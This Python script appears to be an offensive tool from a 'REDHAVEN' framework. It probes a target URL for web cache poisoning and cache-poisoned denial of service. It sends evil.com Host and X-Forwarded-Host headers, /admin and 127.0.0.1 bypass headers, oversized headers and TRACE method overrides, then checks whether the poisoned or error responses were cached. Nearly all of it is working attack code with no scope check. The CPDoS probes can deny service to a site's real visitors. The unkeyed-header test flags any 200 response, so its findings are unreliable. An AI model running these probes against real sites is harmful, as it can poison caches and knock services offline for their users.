#!/usr/bin/env python3
"""
Cache Poisoning Tester - REDHAVEN Framework
Tests for Web Cache Poisoning and CPDoS vulnerabilities
"""

import sys
import argparse
import requests
import hashlib
from typing import Dict, List

BANNER = """
╔══════════════════════════════════════════════════════════╗
║  CACHE POISONING TESTER - Web & CDN Cache Attacks       ║
║  Part of REDHAVEN Framework v1.2                         ║
╚══════════════════════════════════════════════════════════╝
"""

class CachePoisoningTester:
    def __init__(self, url: str):
        self.url = url
        self.findings = []
        self.cache_buster = hashlib.md5(str(id(self)).encode()).hexdigest()[:8]
    
    def test_host_header_poisoning(self) -> bool:
        """Test Host header cache poisoning."""
        print(f"[*] Testing Host header poisoning")
        
        malicious_host = "evil.com"
        
        try:
            # First request with poisoned header
            headers = {'Host': malicious_host}
            r1 = requests.get(f"{self.url}?cb={self.cache_buster}", headers=headers, timeout=5)
            
            # Second request without poisoned header
            r2 = requests.get(f"{self.url}?cb={self.cache_buster}", timeout=5)
            
            # Check if poisoned response is cached
            if malicious_host in r2.text:
                self.findings.append({
                    'type': 'HOST_HEADER_POISONING',
                    'severity': 'HIGH',
                    'description': f'Host header poisoning: {malicious_host} reflected in cached response',
                    'url': self.url
                })
                print(f"    [!] Host header poisoning detected")
                return True
        except Exception as e:
            print(f"    [-] Error: {e}")
        
        return False
    
    def test_x_forwarded_host_poisoning(self) -> bool:
        """Test X-Forwarded-Host poisoning."""
        print(f"[*] Testing X-Forwarded-Host poisoning")
        
        malicious_host = "evil.com"
        
        try:
            headers = {'X-Forwarded-Host': malicious_host}
            r1 = requests.get(f"{self.url}?cb2={self.cache_buster}", headers=headers, timeout=5)
            
            r2 = requests.get(f"{self.url}?cb2={self.cache_buster}", timeout=5)
            
            if malicious_host in r2.text or malicious_host in r2.headers.get('Location', ''):
                self.findings.append({
                    'type': 'X_FORWARDED_HOST_POISONING',
                    'severity': 'HIGH',
                    'description': 'X-Forwarded-Host header poisoning detected',
                    'url': self.url
                })
                print(f"    [!] X-Forwarded-Host poisoning detected")
                return True
        except Exception as e:
            pass
        
        return False
    
    def test_x_forwarded_scheme_poisoning(self) -> bool:
        """Test X-Forwarded-Scheme/X-Forwarded-Proto poisoning."""
        print(f"[*] Testing X-Forwarded-Scheme poisoning")
        
        try:
            headers = {'X-Forwarded-Scheme': 'http'}
            r1 = requests.get(f"{self.url}?cb3={self.cache_buster}", headers=headers, timeout=5)
            
            r2 = requests.get(f"{self.url}?cb3={self.cache_buster}", timeout=5)
            
            # Check if downgraded to HTTP
            if 'http://' in r2.text and 'https://' in self.url:
                self.findings.append({
                    'type': 'X_FORWARDED_SCHEME_POISONING',
                    'severity': 'MEDIUM',
                    'description': 'X-Forwarded-Scheme poisoning (HTTPS downgrade)',
                    'url': self.url
                })
                print(f"    [!] X-Forwarded-Scheme poisoning detected")
                return True
        except Exception as e:
            pass
        
        return False
    
    def test_unkeyed_header_injection(self) -> bool:
        """Test unkeyed header injection."""
        print(f"[*] Testing unkeyed header injection")
        
        unkeyed_headers = [
            ('X-Original-URL', '/admin'),
            ('X-Custom-IP-Authorization', '127.0.0.1'),
            ('X-Rewrite-URL', '/admin'),
            ('X-Forwarded-For', '127.0.0.1'),
        ]
        
        for header_name, header_value in unkeyed_headers:
            try:
                headers = {header_name: header_value}
                r1 = requests.get(f"{self.url}?cb4={self.cache_buster}", headers=headers, timeout=5)
                
                # Check if reflected
                if header_value in r1.text or r1.status_code == 200:
                    self.findings.append({
                        'type': 'UNKEYED_HEADER_INJECTION',
                        'severity': 'MEDIUM',
                        'description': f'Unkeyed header injection: {header_name}',
                        'header': header_name,
                        'url': self.url
                    })
                    print(f"    [!] Unkeyed header: {header_name}")
                    return True
            except Exception as e:
                pass
        
        return False
    
    def test_cpdos_hho(self) -> bool:
        """Test CPDoS HHO (HTTP Header Oversize)."""
        print(f"[*] Testing CPDoS HHO (Header Oversize)")
        
        try:
            # Send oversized header
            headers = {'X-Oversized-Header': 'A' * 8192}
            r1 = requests.get(f"{self.url}?cb5={self.cache_buster}", headers=headers, timeout=5)
            
            # Check if error is cached
            r2 = requests.get(f"{self.url}?cb5={self.cache_buster}", timeout=5)
            
            if r2.status_code in [400, 413, 502, 503]:
                self.findings.append({
                    'type': 'CPDOS_HHO',
                    'severity': 'HIGH',
                    'description': f'CPDoS HHO: Error {r2.status_code} cached after oversized header',
                    'url': self.url
                })
                print(f"    [!] CPDoS HHO detected (status {r2.status_code})")
                return True
        except Exception as e:
            pass
        
        return False
    
    def test_cpdos_hmc(self) -> bool:
        """Test CPDoS HMC (HTTP Method Override)."""
        print(f"[*] Testing CPDoS HMC (Method Override)")
        
        override_headers = [
            'X-HTTP-Method-Override',
            'X-HTTP-Method',
            'X-Method-Override'
        ]
        
        for header in override_headers:
            try:
                headers = {header: 'TRACE'}
                r1 = requests.get(f"{self.url}?cb6={self.cache_buster}", headers=headers, timeout=5)
                
                r2 = requests.get(f"{self.url}?cb6={self.cache_buster}", timeout=5)
                
                if r2.status_code in [400, 405, 501]:
                    self.findings.append({
                        'type': 'CPDOS_HMC',
                        'severity': 'MEDIUM',
                        'description': f'CPDoS HMC: Method override error cached',
                        'header': header,
                        'url': self.url
                    })
                    print(f"    [!] CPDoS HMC detected with {header}")
                    return True
            except Exception as e:
                pass
        
        return False

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description="Cache Poisoning Tester")
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    
    args = parser.parse_args()
    
    print(f"[*] Target: {args.url}")
    print("="*70)
    
    tester = CachePoisoningTester(args.url)
    
    # Run all tests
    tester.test_host_header_poisoning()
    tester.test_x_forwarded_host_poisoning()
    tester.test_x_forwarded_scheme_poisoning()
    tester.test_unkeyed_header_injection()
    tester.test_cpdos_hho()
    tester.test_cpdos_hmc()
    
    # Report
    print("\n" + "="*70)
    if tester.findings:
        print(f"[+] FOUND {len(tester.findings)} CACHE POISONING VULNERABILITIES")
        print("="*70)
        
        for finding in tester.findings:
            print(f"\n[!] {finding['type']} ({finding['severity']}):")
            print(f"  {finding['description']}")
    else:
        print("[-] No cache poisoning vulnerabilities detected")
    
    print("="*70)

if __name__ == '__main__':
    main()
